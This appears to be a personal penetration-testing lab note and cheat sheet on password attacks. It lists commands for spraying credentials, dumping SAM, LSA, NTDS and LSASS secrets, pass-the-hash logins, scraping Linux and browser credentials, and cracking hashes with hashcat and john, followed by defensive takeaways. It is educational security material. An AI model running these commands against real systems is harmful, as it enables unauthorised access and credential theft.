# Password Attacks

> Status: ✅ Complete
> Date started: 2026-10-26
> Date finished: 2026-10-26

## 1. Goal
Obtain, dump, and crack credentials: build wordlists, attack services remotely, loot hashes from Windows/Linux hosts, and crack them offline.

## Default / reused credentials
First thing to try — one overlooked router/printer/firewall with factory creds opens the network:
```bash
creds search mssql            # DefaultCreds-Cheat-Sheet tool (default creds DB by product)
```
Also check CIRT.net and the DefaultCreds-Cheat-Sheet repo. Always test reuse of any found password across other hosts/services.

## Wordlist generation
```bash
cewl https://<site> -d 4 -m 6 --lowercase -w site.wordlist     # scrape words from a site
hashcat --force base.list -r /usr/share/hashcat/rules/best64.rule --stdout > mutated.list   # rule mutations
username-anarchy -i firstlast.txt                               # username formats
```

## Remote password attacks
```bash
crackmapexec winrm <ip> -u users.txt -p pass.txt                # spray WinRM
crackmapexec smb <ip> -u user -p pass --shares                  # test + enum shares
hydra -L users.txt -P pass.txt <service>://<ip>
# dump hashes with valid creds:
crackmapexec smb <ip> --local-auth -u <u> -p <p> --sam          # local SAM
crackmapexec smb <ip> --local-auth -u <u> -p <p> --lsa          # LSA secrets
crackmapexec smb <ip> -u <u> -p <p> --ntds                      # domain NTDS (DA)
evil-winrm -i <ip> -u Administrator -H "<NThash>"               # Pass-the-Hash (WinRM)
# PtH over RDP — first enable Restricted Admin mode on the target, then /pth:
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
xfreerdp /v:<ip> /u:<user> /pth:<NThash>
```

## Windows local credential looting
```text
findstr /SIM /C:"password" *.txt *.ini *.config *.xml *.ps1 *.yml
# LSASS dump (living-off-the-land) → extract offline:
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <lsass_pid> C:\lsass.dmp full
pypykatz lsa minidump lsass.dmp
# SAM/SYSTEM:
reg save HKLM\SAM sam.save ; reg save HKLM\SYSTEM system.save
secretsdump.py -sam sam.save -system system.save LOCAL
# NTDS.dit via shadow copy (on a DC):
vssadmin create shadow /for=C:  →  copy ...\Windows\NTDS\NTDS.dit  →  secretsdump.py -ntds ...
```

## Linux local credential looting
```bash
find / -name "*.cnf" -o -name "*.conf" 2>/dev/null | xargs grep -iE "user|pass" 2>/dev/null
grep -rnw "PRIVATE KEY" / 2>/dev/null       # SSH private keys
find / -name "*.db" -o -name "*.sql" 2>/dev/null
tail -n5 /home/*/.bash*                      # history
grep -rnw "ssh-rsa" /home/* 2>/dev/null      # authorized_keys / pubkeys
cat /etc/crontab ; ls -la /etc/cron.*/       # creds in scheduled jobs
# automated cred dumpers:
./mimipenguin.sh                             # scrape creds from memory (needs root)
python3 lazagne.py all                       # pull stored creds from many apps (browsers, etc.)
# Firefox stored logins:
cat ~/.mozilla/firefox/*.default-release/logins.json | jq .
python3 firefox_decrypt.py                   # decrypt them
```

## Cracking (hashcat / john)
```bash
# common modes:
hashcat -m 1000 ntlm.txt rockyou.txt          # NTLM
hashcat -m 1800 -a 0 unshadowed.txt rockyou.txt   # Linux sha512crypt
hashcat -m 500 md5crypt.txt rockyou.txt       # md5crypt  |  -m 22100 BitLocker
hashcat -m 13100 ...  # Kerberoast TGS  |  -m 18200 AS-REP  |  -m 5600 NetNTLMv2  |  -m 13400 KeePass
# append --show to print already-cracked results from the potfile
# Linux shadow:
unshadow /etc/passwd /etc/shadow > unshadowed.txt
# *2john extractors (then john/hashcat the output):
ssh2john id_rsa > h ; office2john doc.docx > h ; zip2john f.zip > h ; pdf2john.pl f.pdf > h ; bitlocker2john -i disk.vhd > h
john --wordlist=rockyou.txt h
```

## Fix / takeaways
Strong unique passwords + MFA, no password reuse, protect LSASS (Credential Guard), limit who can read SAM/NTDS, strong hashing (no NTLM/RC4). 

> The flow: loot hashes (dump or find them) → identify the type (hashid / hash-identifier) → pick the right hashcat `-m` mode → crack with rockyou + rules. Getting the mode right is half the battle. Credential reuse across hosts is what turns one cracked hash into the whole network.

## My notes / lab output
Filled in as I run these on lab targets.

## 2. Setup
- Attack box: (Pwnbox / Kali VM)
- Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)

## 3. Commands I used
Each block says which machine it ran on.

```bash
# [ATTACK BOX]

```

```bash
# [TARGET]

```

## 4. Confirmed (what worked)
- 

## 5. Tried, didn't work (and why)
- 

## 6. Open questions / revisit
- 

## 7. Cheat sheet lines
Copied into `cheatsheets/`:
- 
